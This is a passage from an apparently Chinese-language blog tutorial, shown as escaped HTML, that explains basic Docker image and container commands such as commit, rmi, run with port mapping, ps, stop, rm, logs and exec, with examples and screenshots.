&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SIZE&lt;/strong&gt;：镜像大小&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;保存更改的镜像&#34;&gt;保存更改的镜像
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker commit &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;选项&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &amp;lt;容器ID&amp;gt;/&amp;lt;容器名称&amp;gt; &amp;lt;镜像名称&amp;gt;:&amp;lt;标签&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;常用选项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-m &amp;quot;提交信息&amp;quot;&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;为此次操作添加描述性说明&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;类似于 Git 的 commit message，便于记录修改内容&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-a &amp;quot;作者&amp;quot;&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;指定作者信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;方便追踪是谁进行了修改或创建操作&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker commit -m&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;update&amp;#34;&lt;/span&gt; -a&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;kakahuote&amp;#34;&lt;/span&gt; 8950b5741b30 mynginx:mod
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令会执行以下操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;把名为&lt;code&gt;8950b5741b30&lt;/code&gt;的容器保存为一个新的镜像&lt;/li&gt;
&lt;li&gt;添加说明信息&lt;code&gt;&amp;quot;update&amp;quot;&lt;/code&gt;，记录镜像的更改内容&lt;/li&gt;
&lt;li&gt;指定作者为&lt;code&gt;kakahuote&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;创建一个名为&lt;code&gt;mynginx&lt;/code&gt;、标签为&lt;code&gt;mod&lt;/code&gt;的新镜像&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723135839721.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723135839721&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;删除镜像&#34;&gt;删除镜像
&lt;/h3&gt;&lt;p&gt;当某个镜像不再需要时，可以将其从本地删除以释放磁盘空间&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker rmi &amp;lt;镜像ID&amp;gt;/&amp;lt;镜像名称&amp;gt;:&amp;lt;标签&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只能删除没有被任何容器（包括已停止的容器）使用的镜像&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果需要删除一个被使用的镜像，必须先删除所有依赖它的容器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;也可以使用&lt;code&gt;-f&lt;/code&gt;选项强制删除，但这可能会导致依赖该镜像的容器无法再次启动或者其他未知错误，慎用！&lt;/p&gt;
&lt;p&gt;如果不指定标签，默认删除的会是&lt;code&gt;latest&lt;/code&gt;标签，如果没有&lt;code&gt;latest&lt;/code&gt;则会报错，所以&lt;strong&gt;建议指定标签删除&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker rmi mynginx:mod
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723140153114.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723140153114&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;容器管理&#34;&gt;容器管理
&lt;/h2&gt;&lt;h3 id=&#34;创建并运行容器&#34;&gt;创建并运行容器
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;选项&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &amp;lt;镜像名称&amp;gt;:&amp;lt;标签&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;常用选项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;--name&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;为容器指定一个自定义的名称&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果省略，Docker会自动生成一个随机名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-d&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;以分离模式在后台运行容器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这对于运行像Web服务器这样的长期服务很重要，否则容器会占据你的终端进行输出和报错等行为&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-P&lt;/code&gt;(大写)&lt;/strong&gt;：将容器内部所有暴露的端口&lt;strong&gt;随机映射&lt;/strong&gt;到主机的空闲端口上&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-p&lt;/code&gt;(小写)&lt;/strong&gt;：&lt;strong&gt;指定端口映射&lt;/strong&gt;，其常用格式如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;主机端口:容器端口&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;docker run -d -p 8080:80 nginx&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
此命令将主机的`8080`端口映射到容器的`80`端口

- **`&amp;lt;IP地址&amp;gt;:主机端口:容器端口`**

指定只将主机的特定IP地址的端口映射到容器

```shell
docker run -d -p 127.0.0.1:8081:80 nginx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此命令将主机&lt;code&gt;127.0.0.1&lt;/code&gt;这个回环地址的&lt;code&gt;8081&lt;/code&gt;端口映射到容器的&lt;code&gt;80&lt;/code&gt;端口&lt;/p&gt;
&lt;p&gt;这样，只有在本机才能通过&lt;code&gt;127.0.0.1:8081&lt;/code&gt;访问，来自外部网络的访问会被拒绝&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;主机端口:&amp;lt;容器端口/协议&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;默认情况下，端口映射使用的是TCP协议，也可以显式指定UDP协议&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Pdocker run -d -p 8082:53/udp nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此命令将主机的&lt;code&gt;8082&lt;/code&gt;端口映射到nginx容器的&lt;code&gt;53&lt;/code&gt;UDP端口&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;--rm&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;使容器在停止后被自动删除&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;适合用于测试和运行一次性任务&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run --name my-nginx -d -p 8080:80 nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令会执行以下操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;检查本地是否存在&lt;code&gt;nginx:latest&lt;/code&gt;镜像，如果不存在，会自动拉取&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基于此镜像创建一个名为 &lt;code&gt;my-nginx&lt;/code&gt; 的容器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;-d&lt;/code&gt;：让这个容器在后台持续运行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;-p 8080:80&lt;/code&gt;：将你本机的8080端口的流量转发到容器内部的80端口（Nginx默认在80端口监听）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;命令执行后，在浏览器中访问&lt;code&gt;http://你的主机IP地址:8080&lt;/code&gt;或&lt;code&gt;http://localhost:8080&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果看到Nginx的欢迎页面，则表示容器已成功运行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250722140517678.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250722140517678&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看正在运行的容器&#34;&gt;查看正在运行的容器
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker ps
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723112548978.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723112548978&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CONTAINER ID&lt;/strong&gt;：容器的唯一标识，&lt;strong&gt;可以用全部或者前几位操作该容器，只要能唯一识别&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IMAGE&lt;/strong&gt;：使用的镜像&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;COMMAND&lt;/strong&gt;：容器启动时运行的命令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CREATED&lt;/strong&gt;：容器创建的时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;STATUS&lt;/strong&gt;：容器状态，这里的字段值是&lt;code&gt;UP&lt;/code&gt;，说明是一个正在运行的容器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PORTS&lt;/strong&gt;：端口映射&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;0.0.0.0:8080-&amp;gt;80/tcp&lt;/code&gt;：主机所有IPv4地址的8080端口被映射到容器内部的80端口（TCP 协议）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;:::8080-&amp;gt;80/tcp&lt;/code&gt;：主机所有IPv6地址的8080端口也映射到容器内部的80端口（TCP 协议）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NAMES&lt;/strong&gt;：自定义的容器的名字&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看所有容器&#34;&gt;查看所有容器
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker ps -a
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;-a&lt;/code&gt;是&lt;code&gt;all&lt;/code&gt;的缩写，代表列出所有容器，包括那些已经停止运行的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个命令可以找到旧的、已停止的容器，以便重新启动它们或将它们删除以进行清理&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723113333889.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723113333889&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这里的&lt;code&gt;STATUS&lt;/code&gt;字段是&lt;code&gt;exited&lt;/code&gt;，说明这是一个退出的、不在运行的容器&lt;/p&gt;
&lt;h3 id=&#34;停止容器&#34;&gt;停止容器
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker stop &amp;lt;容器名称&amp;gt;/&amp;lt;容器ID&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;说明: 此命令会向容器内的主进程发送一个 &lt;code&gt;SIGTERM&lt;/code&gt; 信号，请求其正常关闭。应用程序会接收到这个信号并执行关闭前的清理工作。&lt;/p&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker stop nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723113823707.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723113823707&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;停止后，容器不在运行列表之中&lt;/p&gt;
&lt;h3 id=&#34;启动一个已停止的容器&#34;&gt;启动一个已停止的容器
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker start &amp;lt;容器名称&amp;gt;/&amp;lt;容器ID&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令会使一个处于Exited状态的容器恢复到Up状态，容器会保留其上次停止时的所有配置和数据。&lt;/p&gt;
&lt;p&gt;示例: docker start my-nginx&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723113946571.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723113946571&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;删除容器&#34;&gt;删除容器
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker rm &amp;lt;容器名称&amp;gt;/&amp;lt;容器ID&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;默认情况下，不能删除一个正在运行的容器，必须先使用&lt;code&gt;docker stop&lt;/code&gt;将其停止&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果确定要删除一个运行中的容器，可以添加&lt;code&gt;-f&lt;/code&gt;参数来强制执行&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;容器信息查看与交互&#34;&gt;容器信息查看与交互
&lt;/h2&gt;&lt;h3 id=&#34;查看端口映射&#34;&gt;查看端口映射
&lt;/h3&gt;&lt;p&gt;此命令可以快捷地查看一个容器的端口映射情况&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker port &amp;lt;容器名称&amp;gt;/&amp;lt;容器ID&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker port nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723173634143.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723173634143&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;容器内部的80端口被映射到了：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0.0.0.0:8080&lt;/code&gt;：表示主机的所有&lt;strong&gt;IPv4&lt;/strong&gt;地址上的8080端口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[::]:8080&lt;/code&gt;：表示主机的所有&lt;strong&gt;IPv6&lt;/strong&gt;地址上的8080端口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也就是说，我们可以使用以下任意方式访问这个容器内的Nginx服务：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;http://localhost:8080&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://127.0.0.1:8080&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://&amp;lt;主机的IP&amp;gt;:8080&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果启用了IPv6网络，还可以使用IPv6地址访问，如&lt;code&gt;http://[::1]:8080&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看容器日志&#34;&gt;查看容器日志
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker logs &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;选项&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &amp;lt;容器名称&amp;gt;/&amp;lt;容器ID&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;常用选项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-f&lt;/code&gt;&lt;/strong&gt;：持续跟踪并输出日志&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;--tail&lt;/code&gt;&lt;/strong&gt;：仅显示日志的最后N行&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker logs nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250723115500967.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723115500967&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;在容器内部执行命令&#34;&gt;在容器内部执行命令
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;可以在一个运行中的容器内执行命令，而不进入其交互式Shell&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker &lt;span style=&#34;color:#e5c07b&#34;&gt;exec&lt;/span&gt; &amp;lt;容器名称&amp;gt;/&amp;lt;容器ID&amp;gt; &amp;lt;命令&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker &lt;span style=&#34;color:#e5c07b&#34;&gt;exec&lt;/span&gt; nginx ls -l
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723115709524.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723115709524&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;此命令会在名为&lt;code&gt;nginx&lt;/code&gt;的容器内部执行&lt;code&gt;ls -l&lt;/code&gt; 命令，并返回结果，而我们的终端仍然停留在主机上&lt;/p&gt;
&lt;h3 id=&#34;进入容器的交互式终端&#34;&gt;进入容器的交互式终端
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;对于更复杂的调试，我们就需要一个完整的Shell环境来在容器内部进行操作&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker &lt;span style=&#34;color:#e5c07b&#34;&gt;exec&lt;/span&gt; -it &amp;lt;容器名称&amp;gt;/&amp;lt;容器ID&amp;gt; /bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;-it&lt;/code&gt;是两个选项的组合：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-i&lt;/code&gt;保持标准输入开启，&lt;code&gt;-t&lt;/code&gt;分配一个伪终端，这共同创建了一个可以交互的命令行界面&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;/bin/bash&lt;/code&gt;是一个常见的Shell程序，有些镜像可能提供的是&lt;code&gt;/bin/sh&lt;/code&gt;，比较不好用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;也可以在创建容器的时候就进入其交互式终端：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -it &amp;lt;镜像名称&amp;gt;:&amp;lt;标签&amp;gt; /bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker &lt;span style=&#34;color:#e5c07b&#34;&gt;exec&lt;/span&gt; -it nginx /bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723121248325.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723121248325&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;执行后命令提示符改变，表示已经进入了容器，可以像在普通Linux环境中一样运行命令&lt;/p&gt;
&lt;p&gt;如果想要退出，可以使用&lt;code&gt;Ctrl+D&lt;/code&gt;，或者输入&lt;code&gt;exit&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;容器网络与连接&#34;&gt;容器网络与连接
&lt;/h2&gt;&lt;p&gt;除了端口映射，Docker还提供了强大的网络功能，允许容器之间方便、安全地互相通信&lt;/p&gt;
